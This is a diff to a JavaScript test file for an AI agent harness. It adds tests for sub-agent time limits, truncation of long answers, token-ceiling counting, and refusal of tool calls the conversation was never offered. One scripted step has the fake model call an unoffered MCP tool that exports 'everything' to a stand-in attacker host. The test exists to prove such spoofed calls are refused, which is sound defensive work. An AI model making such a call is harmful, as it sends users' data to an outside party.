@@ -148,6 +148,15 @@ section('sub-agent limits');
     empty = err.message;
   }
   check('no tasks at all is refused', /at least one task/.test(empty), empty);
+
+  // Harness audit, 2026-11-12: sub-agents ran on their own clock past the turn's end, and one
+  // long answer could fill the parent's window.
+  const late = scriptedProvider([{ text: 'too late' }]);
+  const lateOut = await runParallel({ user, chatId: null, tasks: ['anything'], stream: late.stream, deadline: Date.now() + 10_000 });
+  check('with the turn nearly over, a sub-agent starts no step and says it has nothing', late.seen.calls === 0 && /\(no answer\)/.test(lateOut), `${late.seen.calls} calls`);
+  const wordy = scriptedProvider([{ text: 'x'.repeat(20_000) }]);
+  const wordyOut = await runParallel({ user, chatId: null, tasks: ['say a lot'], stream: wordy.stream });
+  check('  one answer is cut at 6,000 characters, saying so', /cut at 6000 characters/.test(wordyOut) && wordyOut.length < 8_000, `${wordyOut.length} chars`);
 }
 
 section('a failing sub-agent is reported as failed');
@@ -1693,6 +1702,67 @@ section('the same read twice in a turn runs once');
   await runAgent({ userId: dupUser.id, user: dupUser, chatId: 'c-dup', emit: () => {}, stream });
   const repeated = seenResults.filter((r) => /already ran in this turn/.test(r.content || ''));
   check('a duplicate in the same batch and one in the next step are both answered from the first', repeated.length === 2, `${repeated.length} of ${seenResults.length}`);
+
+  /*
+   * Harness audit, 2026-11-12: a name the conversation could not have been given — an MCP tool
+   * held since its description changed, a connector's tool with no connector, one a page made
+   * up — was run when the model named it. Refused now, as a class; a deferred tool named
+   * directly still runs, as it always did.
+   */
+  await store.createChat(dupUser.id, { id: 'c-ghost', title: 'ghost' });
+  await store.appendMessage(dupUser.id, 'c-ghost', { id: 'u-ghost-1', role: 'user', text: 'đọc kỹ năng docx' });
+  const ghostResults = [];
+  let ghostCalls = 0;
+  const ghostStream = async function* (opts) {
+    ghostCalls += 1;
+    const last = opts.messages.at(-1);
+    if (last?.role === 'tool') ghostResults.push(...last.results);
+    // One a step: a refused call stops the rest of its batch, as any failed step does.
+    const step = [
+      { id: 'g1', name: 'mcp__ghost__export_everything', input: { to: 'https://attacker.example' } },
+      { id: 'g2', name: 'gmail', input: { action: 'send', to: 'x@example.com' } },
+      { id: 'g3', name: 'skill_read', input: { name: 'docx' } },
+    ][ghostCalls - 1];
+    if (step) {
+      yield { type: 'done', stopReason: 'tool_use', toolCalls: [step], usage: { input: 5, output: 5 } };
+    } else {
+      yield { type: 'text', delta: 'done' };
+      yield { type: 'done', stopReason: 'end_turn', toolCalls: [], usage: { input: 5, output: 5 } };
+    }
+  };
+  await runAgent({ userId: dupUser.id, user: dupUser, chatId: 'c-ghost', policy: 'auto', emit: () => {}, stream: ghostStream });
+  const byId = Object.fromEntries(ghostResults.map((r) => [r.toolCallId, r]));
+  check('an MCP tool this account was never given is refused by name, even under auto', byId.g1?.isError === true && /not one of the tools this conversation has/.test(byId.g1?.content || ''), byId.g1?.content);
+  check("  and so is a connector's tool with no connector linked", byId.g2?.isError === true && /not one of the tools/.test(byId.g2?.content || ''), byId.g2?.content);
+  check('  while a deferred tool named directly still runs', byId.g3 && byId.g3.isError !== true && !/not one of the tools/.test(byId.g3.content || ''), byId.g3?.content?.slice(0, 80));
+  const { unofferedRefusal } = await import('../server/agent.js');
+  check('  and with no list given, nothing is refused', unofferedRefusal({ id: 'x', name: 'anything' }, null) === null);
+
+  // Harness audit, 2026-11-12: near the turn's end no new step starts — stopped between
+  // steps with a Continue, rather than killed by the host part way through one.
+  await store.createChat(dupUser.id, { id: 'c-late', title: 'late' });
+  await store.appendMessage(dupUser.id, 'c-late', { id: 'u-late-1', role: 'user', text: 'đọc kỹ năng docx rồi tóm tắt' });
+  let lateCalls = 0;
+  const lateEvents = [];
+  const lateStream = async function* () {
+    lateCalls += 1;
+    yield { type: 'done', stopReason: 'tool_use', toolCalls: [{ id: `l${lateCalls}`, name: 'skill_read', input: { name: 'docx' } }], usage: { input: 5, output: 5 } };
+  };
+  await runAgent({ userId: dupUser.id, user: dupUser, chatId: 'c-late', emit: (type, payload) => lateEvents.push({ type, payload }), stream: lateStream, deadlineAt: Date.now() + 30_000 });
+  const lateDone = lateEvents.find((e) => e.type === 'done')?.payload;
+  check('with too little of the turn left, the first step runs and the next does not start', lateCalls === 1 && lateDone?.stopReason === 'time_limit', JSON.stringify({ lateCalls, stop: lateDone?.stopReason }));
+  check('  and it can be continued', lateDone?.stop?.resumable === true && /Continue/.test(lateDone?.stop?.message || ''), JSON.stringify(lateDone?.stop));
+
+  // Harness audit, 2026-11-12: the turn's token ceiling counted only the main loop's calls.
+  const { withTrace } = await import('../server/util/trace.js');
+  const { record } = await import('../server/usage.js');
+  const spend = { tokens: 0 };
+  await withTrace({ turnSpend: spend }, async () => {
+    await record(dupUser.id, { chatId: 'c-late', model: 'm', usage: { input: 1_000, output: 200 }, role: 'subagent' });
+    await record(dupUser.id, { chatId: 'c-late', model: 'm', usage: { input: 3_000, output: 500 }, role: 'research' });
+    await record(dupUser.id, { chatId: 'c-late', model: 'm', usage: { input: 9_999, output: 9_999 }, role: 'turn' });
+  });
+  check("a sub-agent's and a research run's tokens count toward the turn's ceiling; the loop's own it counts itself", spend.tokens === 4_700, String(spend.tokens));
 
   // UX-017: a free model wrote `<system>success</system>` on a line of its own (owner, 2026-11-02).
   await store.createChat(dupUser.id, { id: 'c-stray', title: 'stray' });
